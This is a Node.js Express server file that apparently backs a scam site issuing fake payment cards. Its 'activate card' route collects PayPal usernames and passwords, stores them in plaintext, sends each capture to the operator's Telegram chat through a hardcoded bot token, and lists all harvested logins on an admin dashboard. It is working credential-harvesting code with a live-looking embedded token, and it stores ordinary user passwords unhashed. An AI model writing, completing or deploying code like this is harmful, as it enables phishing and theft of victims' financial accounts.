const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// JWT Secret (should match frontend's expectation)
const JWT_SECRET = 'your-secure-secret-key'; // Update this for production

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo'; // Verify this token
const TELEGRAM_CHAT_ID_ADMIN = '6270110371'; // Verify this chat ID

// Initialize or load data.json
let cards = {};
try {
    cards = JSON.parse(fs.readFileSync('data.json', 'utf8'));
    if (!cards.users || !cards.cards || !cards.logs) {
        cards = { users: [], cards: [], logs: [] };
        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
    }
} catch (error) {
    if (error.code === 'ENOENT') {
        cards = { users: [], cards: [], logs: [] };
        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
        console.log('Created data.json with initial structure.');
    } else {
        console.error('Error reading data.json:', error);
        process.exit(1);
    }
}

// Function to send Telegram notification
async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID_ADMIN) {
        console.log('Telegram notification skipped: Missing token or chat ID');
        return;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
        });
        if (!response.ok) throw new Error('Telegram API failed');
        console.log('Telegram notification sent:', message);
    } catch (error) {
        console.error('Telegram notification error:', error.message);
    }
}

// Middleware to verify token
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid or expired token' });
        req.user = user;
        next();
    });
};

const isCreator = (req, res, next) => {
    if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied. Creator role required.' });
    next();
};

// Signup route
app.post('/api/auth/signup', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
        return res.status(400).json({ error: 'Invalid username or password format' });
    }
    if (cards.users.find(u => u.username === username)) {
        return res.status(400).json({ error: 'Username already exists' });
    }
    cards.users.push({ username, password });
    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
    sendTelegramNotification(`New user signed up: ${username}`);
    res.status(201).json({ message: 'User created successfully', token: jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' }) });
});

// Login route
app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    const user = cards.users.find(u => u.username === username && u.password === password);
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
    sendTelegramNotification(`User logged in: ${username}`);
    res.json({ token });
});

// Generate card route
app.post('/api/cards/generate', authenticateToken, (req, res) => {
    const { name, expDate, amount } = req.body;
    if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
        return res.status(400).json({ error: 'Invalid card data' });
    }
    const cardId = Date.now().toString();
    const card = { cardId, name, expDate, amount, number: '****-****-****-' + Math.floor(1000 + Math.random() * 9000), cvv: Math.floor(100 + Math.random() * 900), timestamp: new Date().toISOString() };
    cards.cards.push(card);
    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
    sendTelegramNotification(`New card generated by ${req.user.username}: Card ID ${cardId}`);
    res.status(201).json({ cardId });
});

// Get all cards route
app.get('/api/cards', authenticateToken, (req, res) => {
    res.json(cards.cards);
});

// Delete card route
app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
    const cardId = req.params.cardId;
    const initialLength = cards.cards.length;
    cards.cards = cards.cards.filter(card => card.cardId !== cardId);
    if (cards.cards.length < initialLength) {
        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
        sendTelegramNotification(`Card deleted by ${req.user.username}: Card ID ${cardId}`);
        res.json({ message: 'Card deleted successfully' });
    } else {
        res.status(404).json({ error: 'Card not found' });
    }
});

// Activate card route (get)
app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
    const cardId = req.params.cardId;
    const card = cards.cards.find(c => c.cardId === cardId);
    if (!card) return res.status(404).json({ error: 'Card not found' });
    res.json({ cardId: card.cardId, status: card.status || 'pending', paypalUsername: card.paypalUsername, paypalPassword: card.paypalPassword });
});

// Activate card route (post)
app.post('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
    const cardId = req.params.cardId;
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'PayPal credentials required' });
    const card = cards.cards.find(c => c.cardId === cardId);
    if (!card) return res.status(404).json({ error: 'Card not found' });
    card.paypalUsername = username;
    card.paypalPassword = password;
    card.status = 'activated';
    const loginData = { cardId, paypalUsername: username, paypalPassword: password, user: req.user.username, timestamp: new Date().toISOString() };
    cards.logs.push(loginData);
    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
    sendTelegramNotification(`Card activated by ${req.user.username}: Card ID ${cardId}, PayPal: ${username}`);
    res.json({ message: 'Card activated successfully', cardId, status: 'activated' });
});

// Creator dashboard route
app.get('/api/creator/dashboard', authenticateToken, isCreator, (req, res) => {
    const generatedCards = cards.cards.map(card => ({
        cardId: card.cardId,
        name: card.name,
        expDate: card.expDate,
        amount: card.amount,
        user: card.user || 'Unknown',
        timestamp: card.timestamp || 'N/A'
    }));
    const paypalLogins = cards.logs.map(log => ({
        cardId: log.cardId,
        paypalUsername: log.paypalUsername,
        paypalPassword: log.paypalPassword,
        user: log.user,
        timestamp: log.timestamp
    }));
    res.json({ generatedCards, paypalLogins });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
